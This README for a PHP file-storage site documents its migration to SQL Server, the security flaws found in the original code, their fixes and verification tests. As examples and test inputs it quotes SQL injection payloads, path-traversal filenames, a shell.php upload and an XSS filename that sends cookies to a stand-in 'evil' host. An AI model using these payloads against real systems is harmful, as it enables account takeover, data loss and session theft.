# Free File Storage

A small PHP file-storage site, originally written against MySQL with mysqli, now
running on Microsoft SQL Server through PDO with all data access behind stored
procedures.

---

## Setup

**Status on this machine: working.** Verified end to end through Apache
(PHP 8.3.28) against SQL Server 2022 on a separate machine on the LAN,
connecting as the least-privilege `ffs_app` login.

The project lives at `C:\wamp64\www\Free-File-Storage-Updated` and is served at
<http://localhost:8080/Free-File-Storage-Updated/>. An older copy at
`C:\Free-File-Storage-Updated` is abandoned — see the `ABANDONED.md` in it.

Confirm the database connection at any time with:

```bash
php tools\check-db.php
```

Outstanding housekeeping: end-to-end testing created two `ffs_testuser_*`
accounts. Remove them with `sql/99_remove_test_users.sql`, run under an **admin
login** — `ffs_app` cannot delete users, by design.

### 1. Install the SQL Server driver for PHP

1. Install the **Microsoft ODBC Driver 17 or 18 for SQL Server**.
2. Download the **Microsoft Drivers for PHP for SQL Server** from the
   [msphpsql releases](https://github.com/microsoft/msphpsql/releases) matching
   your PHP version, thread safety, and architecture. Driver **5.13+** is
   required for PHP 8.4 or 8.5.
3. Copy the DLL into the PHP `ext` directory.
4. Add the extension to `php.ini`, using the **full DLL filename** — the
   released files are named `php_pdo_sqlsrv_<ver>_ts_x64.dll`, which does not
   match the bare `extension=pdo_sqlsrv` naming convention:
   ```ini
   extension=php_pdo_sqlsrv_84_ts_x64.dll
   ```
5. Restart Apache and confirm with `php -m`.

**WAMP keeps two ini files per PHP version, and they are not the same file:**

| File | Used by |
| --- | --- |
| `bin\php\php<ver>\php.ini` | the CLI |
| `bin\php\php<ver>\phpForApache.ini` | Apache (the module) |

`bin\apache\apache<ver>\bin\php.ini` looks like a third one but is a **symlink**
to the active version's `phpForApache.ini` — which is why opening it shows a
different PHP version in the header than the CLI you may be running. Editing
only `php.ini` gets the extension working on the command line while Apache still
reports it missing. Both need the line.

Also check which version Apache is actually pinned to, since WAMP lets the CLI
default and the Apache module differ:

```bash
grep -i "LoadModule php_module" C:/wamp64/bin/apache/apache2.4.65/conf/httpd.conf
```

### 1b. Connecting to a SQL Server on another machine

This is the intended setup here. Three things differ from a same-machine
connection, and all three cause confusing errors when missed.

**Use a SQL login, not Windows authentication.** Apache runs as **LocalSystem**,
which on the network presents itself as the *machine* account (`DOMAIN\THISPC$`),
not as you. Granting that rights on the remote server is possible but awkward.
Create the `ffs_app` login from `sql/03_security.sql` on the SQL Server and use
that. The server must be in **Mixed Mode** for a SQL login to work:
*Server Properties → Security → "SQL Server and Windows Authentication mode"*,
then restart the SQL Server service.

**Keep encryption on.** Credentials and every query result now cross a physical
network. `encrypt => true` is the default in `config.php` and must stay that way.
`trust_cert => true` means encrypted-but-unverified: safe from a passive
listener, but not from someone who can redirect your connection. Get a
certificate the client machine trusts and set `trust_cert => false`.

**On the server, make sure it is actually reachable:**

- SQL Server Configuration Manager → Protocols → **TCP/IP → Enabled**, then
  restart the instance. TCP/IP is off by default on Express editions.
- Open the port in Windows Firewall (TCP 1433 for a default instance).
- For a **named instance** (`SQLBOX\SQLEXPRESS`), set `'port' => 0` and make sure
  the **SQL Server Browser** service is running (UDP 1434) — it resolves the
  instance name to its dynamic port. Sending both a name and a port fails.

Then verify with the diagnostic, which checks each layer separately and explains
whichever one fails:

```bash
php tools\check-db.php
```

*(Aside: SQL Server Express **LocalDB** works from the CLI and `php -S`, which
run as you, but never under Apache — LocalDB instances are per-user and
LocalSystem cannot reach one owned by your login. The commented block at the
bottom of `config.local.php` has those settings if you want offline development.)*

### 1c. Deferred: putting uploads on the remote PC

Considered on 2026-07-25 and **deliberately not done**. Recorded here so the
reasoning is not lost.

The code needs no changes for this — `storage_path` in `config.php` accepts any
path, including a UNC path like `\\SQLBOX\ffs-storage`. The obstacle is
authentication:

- WAMP's Apache runs as **LocalSystem**.
- These machines are in a **workgroup**, not a domain (`PartOfDomain: False`),
  so there is no shared directory service and no machine-account trust.
- A workgroup LocalSystem therefore reaches a remote SMB share as **ANONYMOUS**,
  which modern Windows refuses by default. SMB port 445 is open and the box is
  reachable; the identity is what fails.

Two ways to unblock it, whenever it becomes worth doing:

1. **Matching local account on both machines** — same username *and* password on
   each (the standard workgroup approach), with `wampapache64` set to log on as
   it in `services.msc`. Then set `storage_path` to the UNC path and nothing else
   changes.
2. **Store the bytes in SQL Server** — over the connection that is already
   authenticated, so no Windows accounts are involved. Needs a `VARBINARY(MAX)`
   or FILESTREAM column, revised procedures, and streaming in the storage layer
   to avoid loading a 64 MB upload into memory.

Until then uploads stay on the web server under `User Directories/`, which works
and is protected by the deny rules in that folder.

### 2. Create the database

Run the three scripts in order:

```bash
sqlcmd -S "(localdb)\MSSQLLocalDB" -E -b -i "sql\01_schema.sql" -i "sql\02_procedures.sql" -i "sql\03_security.sql"
```

Substitute your own server for `-S`. Set a real password in
`sql/03_security.sql` before running it, or use Windows authentication and skip
the password entirely (see the note at the bottom of that file).

### 3. Configure

```bash
copy config.local.example.php config.local.php
```

Edit it with your server and credentials. `config.local.php` is gitignored.
Every setting can also come from an environment variable (`FFS_DB_HOST`,
`FFS_DB_USER`, and so on) if you would rather not have a file at all.

Two connection details that cost time to discover:

- **Do not set a port for LocalDB or a named instance.** Both connect by name
  (named pipe, or the SQL Browser resolving a dynamic port), and
  `Server=host\instance,1433` fails. Set `'port' => 0` and `sqlsrv_server_spec()`
  in `functions/db.php` omits it.
- **LocalDB has no TLS certificate.** With `encrypt => true` it refuses the
  connection outright: *"Encryption not supported on SQL Server"*. The local
  config sets `encrypt => false`; a real SQL Server deployment must keep
  encryption on with `trust_cert => false`.

### 4. Before going live

- [ ] **Delete `legacy-mysql/`.** It is the original code, kept only so you can
      compare. It contains working SQL injection and stores passwords in
      plaintext. It ships with `.htaccess` and `web.config` deny rules, but the
      PHP built-in dev server ignores those — I confirmed it serves those files
      on `php -S`. Under Apache or IIS the rules apply; deleting is certain.
- [ ] **Move storage outside the webroot.** Set `storage_path` to something like
      `C:\ffs-storage`. The default keeps the original `User Directories`
      location so an existing install still works, and that directory has deny
      rules, but out of the webroot needs no web-server cooperation at all.
- [ ] Set `secure_cookies` to `true` and serve over HTTPS.
- [ ] Set `debug` to `false`.
- [ ] Set `trust_cert` to `false` with a properly trusted certificate. Leaving it
      `true` means the connection is encrypted but unauthenticated, which does
      not stop an active attacker.

### Running locally

LocalDB stops when idle, so start it first:

```bash
sqllocaldb start MSSQLLocalDB
```

```bash
php -S localhost:8000
```

Then open <http://localhost:8000> and register an account. Note that the built-in
server ignores `.htaccess`, so use Apache or IIS for anything but development.

---

## Layout

```
bootstrap.php            Loaded first by every page: errors, headers, session
config.php               Settings from env vars + config.local.php
config.local.php         Local settings (gitignored) - points at LocalDB
config.local.example.php Template for local settings

index.php                Sign in (form)
login.php                Sign in (handler)
register.php             Registration (form + handler)
logout.php               Sign out
files.php                Dashboard: upload form + file list
submit.php               Upload handler
download.php             Ownership-checked file streaming
delete.php               Delete handler
upload.php, fetch.php    Redirects to the pages that replaced them

functions/db.php         PDO connection + stored-procedure calls
functions/auth.php       Sign in, registration, validation
functions/session.php    Session, CSRF, flash messages, login guard
functions/storage.php    Upload validation and safe paths
functions/util.php       Escaping, UUIDs, formatting
functions/layout.php     Shared page header/footer

sql/01_schema.sql        Tables
sql/02_procedures.sql    Every statement the app runs
sql/03_security.sql      Least-privilege database account

assets/site.css          Styles
assets/site.js           Delete confirmation (progressive enhancement)

tools/check-db.php       Connection diagnostic - run this first when it breaks

legacy-mysql/            Original code, for reference. Delete before deploying.
```

---

## What was wrong with the original

Grouped by severity. Everything here was live in the code as written.

### Critical

**1. SQL injection in every query.** Nine files built SQL by string
interpolation. The login check was the worst:

```php
"SELECT * FROM users WHERE UserName = '$username' AND Password = '$password'"
```

Submitting `' OR '1'='1` as the password made the WHERE clause true, returned a
row, and logged the visitor in as the first user in the table — no password
needed. `htmlspecialchars()` was applied to both fields first, but that escapes
HTML, not SQL; it does not touch the `'` character in a way that helps here.

*Now:* the application contains no SQL text at all. Everything goes through
`{CALL ffs.Something(?, ?)}` with bound parameters.

**2. Passwords stored in plaintext.** `createuser.php` inserted the password
as typed, and `auth.php` compared it with `=` in SQL. Anyone with read access
to the database — or a copy of a backup — had a working list of credentials,
and because people reuse passwords, credentials for their other accounts too.

*Now:* `password_hash()` with `PASSWORD_DEFAULT` (bcrypt) at **cost 12**, verified
in PHP with `password_verify()`.

Cost 12 was chosen by measuring this hardware rather than by reputation — 164 ms
per hash, against 44 ms for PHP's default of 10 and 657 ms at 14. Each step
doubles an offline cracker's cost per guess, but the server pays it on every
login too, so 14 would be felt by users and would hand an attacker a cheap way
to burn CPU by spamming the login form. 100–250 ms is the band worth aiming at.

Raising it later is free: `authenticate_user()` calls `password_needs_rehash()`
and silently re-hashes at the new cost the next time each user signs in — login
is the only moment the plaintext exists to re-hash with. Verified against the
live database: an existing `$2y$10$` hash became `$2y$12$` on one login (230 ms
for that login, 177 ms thereafter) with the password still valid.

Both `password_hash()` and `password_needs_rehash()` take their arguments from a
single `password_options()` function. If those two ever disagree, either nobody
migrates or everybody re-hashes on every login, and neither failure is visible
from the outside.

**3. Uploading a `.php` file gave you code execution.** Uploads went to
`./User Directories/$user/$category/` — inside the document root — under the
name the browser supplied, and the dashboard linked straight at them. Uploading
`shell.php` and clicking the link ran it, as the web server user, with the
database credentials sitting in the files next to it. That is full server
compromise from an unprivileged account.

*Now:* stored files are named `<uuid>.<ext>`, the directory has deny rules for
both Apache and IIS, `download.php` streams the bytes after an ownership check,
always as `application/octet-stream` with an attachment disposition, and
server-executable extensions are refused outright.

**4. Path traversal in the upload path.** That same path was built from
`$_SESSION['user']`, `$_POST['category']`, and `$_FILES["file"]["name"]` with no
validation. A multipart part named `../../../index.php` wrote outside the
intended directory.

*Now:* the path is assembled entirely from values the server generates — a UUID
for the user, a category checked against an allowlist, a UUID for the file. The
browser-supplied name is kept only as a display label.

**5. Anyone could read or delete anyone's files.** `fetch.php` and `delete.php`
read a form field that concatenated the user id and file id:

```php
$identifier = $_POST['identity'];
$userID = substr($identifier, 0, 38);
$fileID = substr($identifier, 38, 76);
```

The user id came from the request, not the session. Editing that hidden value in
the page reached any other user's files.

*Now:* the forms post only a file id. The owner is taken from the session and
passed to `ffs.GetUserFile` / `ffs.DeleteFile`, which have the ownership
predicate built into the lookup.

**6. The delete stored procedure deleted the entire table.** In the original
`ffs_delFile`, the parameter was named `FileID` — identical to the column. So:

```sql
DELETE f FROM files f WHERE f.FileID = FileID
```

resolved to `f.FileID = f.FileID`, always true. Any single delete wiped every
row in `files`. T-SQL's `@` prefix on parameters makes this collision
impossible, and the rewritten procedure also scopes by owner.

**7. The login check never stopped the page.** `upload.php` did this:

```php
if(!isset($_SESSION['user'])){
    header("Location: index.php?fail=nousers");
}
```

No `exit`. PHP sent the header and then rendered the rest of the page, including
the file listing, into the response body. Browsers usually follow the redirect
and discard it; `curl -i` does not. I verified the replacement returns a
zero-byte body.

*Also:* the redirect target was `fail=nousers`, but `index.php` only handled
`nouser` — so the message never displayed anyway.

### High

**8. No CSRF protection anywhere.** Any page on the internet could POST to
`delete.php` on behalf of a signed-in visitor. `delete.php` also accepted GET,
so an `<img src="delete.php?identity=...">` in an email was enough.

*Now:* a token in every form, checked with `hash_equals()`, plus `SameSite=Lax`
cookies and POST-only handlers. Verified: GET returns 405, missing or wrong
token returns 419.

**9. Stored XSS through filenames.** Filenames came back out of the database and
were echoed raw:

```php
echo $row['Name'];
$link = $row['Location'];
echo "<a href='$link'>$link</a>";
```

A file uploaded as `<img src=x onerror=fetch('//evil/'+document.cookie)>.txt`
ran for anyone who viewed the list.

The root cause is an inversion: the original escaped on *input* (at
registration) and not on output. Escaping on input also corrupted stored data —
`O'Brien` became `O&#039;Brien` in the database — while doing nothing for values
arriving from anywhere else.

*Now:* store what the user typed, escape at the point of output. Every dynamic
value in a template goes through `e()`.

**10. Session fixation.** The session id was never regenerated at login, so an
attacker who could plant a session cookie kept a valid id after the victim
signed in.

*Now:* `session_regenerate_id(true)` on login, plus `HttpOnly`, `SameSite=Lax`,
`use_strict_mode`, a 30-minute idle timeout and a 12-hour absolute cap.

**11. Database credentials hardcoded in nine files**, all four accounts sharing
the password `userPass`, committed to the repository. Rotating the password
meant a find-and-replace across the codebase.

**12. The four database accounts were decorative.** `sqlusers.sql` created
`user_check`, `user_insert`, `user_select` and `user_delete`, each granted a
narrow privilege on `*.*` — every database on the server, including `mysql.user`
— and then, on the very next line, `GRANT ALL PRIVILEGES ON file_storage.*`. The
split bought nothing; any one of them could drop the schema.

*Now:* one account with `GRANT EXECUTE ON SCHEMA::ffs` and an explicit `DENY` on
the tables. It reaches the data only through the procedures, via ownership
chaining. `sql/03_security.sql` includes the queries to verify this.

**13. Error output leaked internals.** `or die(mysqli_error($con))` printed the
database error — schema names, query fragments — to the browser.

*Now:* a generic page; detail goes to the error log. Verified with `debug=false`.

### Medium

**14. `com_create_guid()`** is Windows-only, needs the COM extension, and offers
no documented entropy guarantee. File ids appear in URLs, so they must be
unguessable. Replaced with a UUID v4 built from `random_bytes()`.

**15. MyISAM had no transactions.** `submit.php` inserted into `files` and
`user_files` over two separate connections. A failure on the second left a row
in `files` owned by nobody — invisible in the UI and impossible to delete.
Now one procedure, one transaction, with the orphaned bytes cleaned up if it
rolls back.

**16. A race in the username check.** `check.php` did `SELECT` then `INSERT`;
two simultaneous registrations could both pass. Now a unique index decides, and
the procedure translates the violation into a friendly message.

**17. Upload errors were all reported as "unknown error"** — the code tested
`error > 0`, so `UPLOAD_ERR_NO_FILE` and success were indistinguishable. Each
`UPLOAD_ERR_*` now has its own message.

**18. `$_FILES['type']` was trusted.** That value is supplied by the browser.
Now detected from the file's own bytes with `finfo`.

**19. `display_files.php` listed every user's files with no login check at all.**
Removed.

**20. Assignment instead of comparison.** In `upload.php`:

```php
if($wasSentFromFetch == "true" && $downloadReady = "1")
```

`=` not `==`, so the condition was always true.

**21. `@` error suppression** on `$_GET` reads hid genuine problems. Replaced
with `??`.

**22. `index.html`** had a login form with `type="text"` on the password field,
so passwords were typed in the clear. It posted to `login.php` and was reachable
as a stale copy of the login page. Removed.

### Also fixed

- No doctype, no `<meta charset>`, no viewport meta — the layout was built from
  nested `<table>` elements with `bgcolor` attributes, and phones got the
  desktop layout scaled down.
- No security headers. Now `Content-Security-Policy`, `X-Content-Type-Options`,
  `X-Frame-Options`, `Referrer-Policy`.
- `utf8` in MySQL 5.x was 3 bytes per character and mangled anything outside the
  BMP. Columns are `NVARCHAR` now.
- Application state lived in URLs (`?fail=nouser`, `?code=pwdshort`) which users
  could edit or bookmark. Replaced with session flash messages.
- Login errors distinguished "no such user" from "wrong password", which allowed
  username enumeration. One message now, and the unknown-user path does a dummy
  `password_verify()` so it does not return measurably faster.
- Registration form values were lost on a validation error.

---

## A note on stored procedures and security

Moving the SQL into procedures was the right call here, but it is worth being
precise about *why*, because the common version of this claim is not quite true.

**Procedures are not automatically safer.** A procedure that builds a string and
runs `EXEC(@sql)` is exactly as injectable as the inline query was — the
concatenation just moved into the database. Conversely, a parameterised query
sent from PHP is not injectable at all. The protection comes from
parameterisation, and both approaches can have it.

There are no `EXEC(@sql)` or `sp_executesql`-with-concatenation calls anywhere in
`sql/02_procedures.sql`. That is what makes the parameterisation real.

**What procedures genuinely buy you** is the permission boundary. Because the
app only ever needs `EXECUTE`, the database account can be granted `EXECUTE` and
nothing else — no `SELECT` on `users`, no `DELETE` on anything. That is not
possible when the app sends its own SQL, because then it needs table
permissions by definition, and any injection flaw inherits them.

So the layers are:

1. Parameters, not concatenation — inside the procedures and at the PHP call.
2. `GRANT EXECUTE` only, with `DENY` on the tables — the app *cannot* read the
   users table directly even if something upstream goes wrong.
3. Ownership checks inside the procedures, so authorisation cannot be forgotten
   by a caller.

Two other things procedures gave us here: the delete became a single transaction
instead of two connections that could half-fail, and `@`-prefixed parameters
structurally prevent the column-name shadowing bug that made the original
`ffs_delFile` delete every row.

Worth knowing about the trade-off: procedures put business logic in a place your
version control and test tooling reach less naturally, and they are the main
reason a project ends up tied to one database engine. For this app that is fine.
On a larger one, most teams get the same safety from a query builder or ORM that
parameterises by construction, and accept a less tight permission boundary.

---

## Frameworks

You asked whether there are PHP frameworks that help. Yes — this is the part of
PHP that changed most since this code was written, and it is worth knowing what
is out there even if you leave this project as it is.

### The main options

**[Laravel](https://laravel.com)** is where most new PHP work starts. Batteries
included: routing, the Eloquent ORM, migrations, authentication scaffolding,
validation, templating, queues, a test harness. Everything this project needed
hand-writing — CSRF tokens, password hashing, the login guard, escaping in
templates — is default behaviour. Its Blade templates escape on output unless
you explicitly ask them not to, which is exactly the inversion that caused the
stored-XSS bug here. Best documentation of any PHP framework and by far the
largest job market. It is opinionated and fairly heavy; that is the trade.

**[Symfony](https://symfony.com)** is the more conservative, component-based
choice, and common in enterprise work. You can adopt it whole or use individual
components standalone. Laravel is built on several of them. More explicit
configuration than Laravel, less magic, steeper start.

**[Slim](https://slimframework.com)** is a micro-framework — routing, middleware,
dependency injection, and little else. If you wanted to modernise *this* project
into a framework without a rewrite, Slim is the closest fit: it would give you
routing and middleware while the structure stays recognisable.

**[Symfony components à la carte](https://symfony.com/components)** is worth
mentioning separately. You do not need a framework to get the good parts. Adding
just `symfony/http-foundation` for proper request/response objects, or
`doctrine/dbal` for database access, is a legitimate half-step.

### For a project this size

Honestly? A rewrite into Laravel is not obviously worth it for a handful of
pages, and it is a different project rather than a refactor. But three things
from that ecosystem are worth adopting on their own, in roughly this order:

1. **[Composer](https://getcomposer.org)**, the dependency manager. Even with no
   dependencies, PSR-4 autoloading replaces the chain of `require` statements at
   the top of every file. This is the one I would actually do.
2. **A template engine** — [Twig](https://twig.symfony.com) or Blade — that
   escapes by default. The `e()` discipline in this code is correct but relies
   on remembering it every single time; a template engine makes forgetting the
   thing you have to do deliberately.
3. **[PHPStan](https://phpstan.org)** or [Psalm](https://psalm.dev), static
   analysis. Run at a decent level, it catches the `$downloadReady = "1"`
   assignment-in-condition bug and the `$row['ID']` typo in `increment_user.php`
   without running anything.

If you do want the framework route, Laravel's own starter kits give you
registration, login, password reset and email verification already built and
tested — which for an app whose whole job is "files belong to users" is most of
the security-sensitive surface handled for you.

---

## Verification

Everything below was executed against SQL Server 2019 (LocalDB 15.0.4382) with
`pdo_sqlsrv` 5.13.1, on **both** PHP 8.4.15 (the CLI) and PHP 8.3.28 (the version
Apache loads).

**Static**

- `php -l` across all 20 PHP files — clean.
- 50 unit checks: UUID generation, HTML escaping, filename sanitising
  (traversal, null bytes, control characters), category validation, the
  extension blocklist, registration validation, password hashing round trips.
- 19 checks confirming inputs and output parameters bind to the positions the
  stored procedures declare, including outputs sandwiched between inputs.

**Database**

- All three SQL scripts run clean; 3 tables and 8 procedures created.
- The permission boundary, tested as `ffs_app`:
  `SELECT` on `dbo.users` → *"The SELECT permission was denied"*;
  `DELETE` on `dbo.files` → denied;
  `EXEC ffs.CreateUser` and `EXEC ffs.GetUserForLogin` → succeed.
  So the app account genuinely cannot read the users table, and reaches the data
  only through the procedures.
- Procedure behaviour: duplicate username and email each return the right status;
  `ListUserFiles` scoped to the owner; `GetUserFile` returns nothing for a
  stranger's file id; **`DeleteFile` with a stranger's id removes nothing and
  leaves the `files` table at full row count** — the case where the original
  procedure deleted every row; shared files keep their bytes until the last owner
  releases them.

**PHP against the live database (36 checks, both PHP versions)**

- Registration, duplicate detection, login, wrong password, unknown user.
- Ten SQL injection payloads (`' OR '1'='1`, `'; DROP TABLE users; --`,
  `' UNION SELECT ...`) submitted as both username and password: all rejected,
  and the `users` table still present afterwards.
- Passwords stored as `$2y$12$...`, never the plaintext; a hash written at a
  weak cost is upgraded automatically on next login.
- Unicode filenames (`отчёт 日本語 café 🎉.txt`) round-trip intact through
  `NVARCHAR`.
- `DeleteFile`'s two output parameters bind and return correctly — the part I
  had flagged as most likely to need shaking out. It worked unchanged.

**Full HTTP journey**

Register → validation rejection → login (wrong, then right) → upload → list →
download → delete → logout, driven with curl over a real session:

- Security headers present; missing and forged CSRF tokens → 419; GET on
  `delete.php` and `logout.php` → 405; unauthenticated `files.php` → 302 with a
  **zero-byte** body.
- A file uploaded as `<img src=x onerror=alert(1)>.txt` is stored verbatim and
  rendered escaped — no raw `<img ... onerror>` anywhere in the document.
- Filenames `../../../../evil.txt` and `..\..\..\..\windows-evil.txt` are reduced
  to their basename; nothing was written outside the storage root.
- A `.php` upload is refused: *"Files of that type cannot be stored here."*
- A category of `../../../Windows` is refused.
- On disk, files land as `<user-uuid>/<Category>/<file-uuid>.txt` — no
  attacker-controlled component in the path.
- `download.php` returns `200` with `Content-Type: application/octet-stream` and
  `Content-Disposition: attachment`, never the stored content type.
- Deleting through the UI removes both the row and the bytes: storage went back
  to zero files.

**Worth knowing:** SQL Server returns `UNIQUEIDENTIFIER` values in **uppercase**
(`2C10D357-E386-...`). The code handles this — `is_uuid()` is case-insensitive
and the values round-trip unchanged — but it will bite you when writing tests or
comparing ids, as it did mine.

**Under Apache, against the real SQL Server**

The whole journey again through `httpd` on port 8080 talking to SQL Server 2022:
guards, registration, login, six injection payloads, hostile uploads, download,
delete, logout — all as above, plus:

- `.htaccess` deny rules confirmed working (they are silently ignored by the PHP
  built-in server, so this was the first real test of them): `legacy-mysql/`,
  `User Directories/`, `sql/`, `tools/`, `config*.php` and directory listings all
  return **403**.
- Six SQL injection payloads — including `x' AND 1=CONVERT(int,@@version)--`,
  which targets SQL Server's error-based disclosure specifically — all rejected,
  with the schema intact afterwards.

Two bugs that only appeared under Apache, both now fixed:

- **CSRF rejection returned 500 instead of 403.** The handler used status `419`,
  a Laravel convention that is not a registered HTTP status code. PHP sets it,
  but Apache maps unrecognised codes to 500 on the way out, so a correct
  rejection looked like a server crash. The built-in server passes 419 through
  unchanged, which is exactly why this hid until deployment.
- **`tools/check-db.php` was executable over HTTP** and printed the database
  host, database name and login name to any anonymous visitor — on a server
  listening on `0.0.0.0`. It now refuses to run unless `PHP_SAPI === 'cli'`, and
  the directory is denied as well. Two independent defences, because a deny rule
  is server configuration and does not travel with the code.

**Still not verified:** nothing has been served through IIS, so the `web.config`
counterparts to the `.htaccess` rules are untested. The Apache side is confirmed.
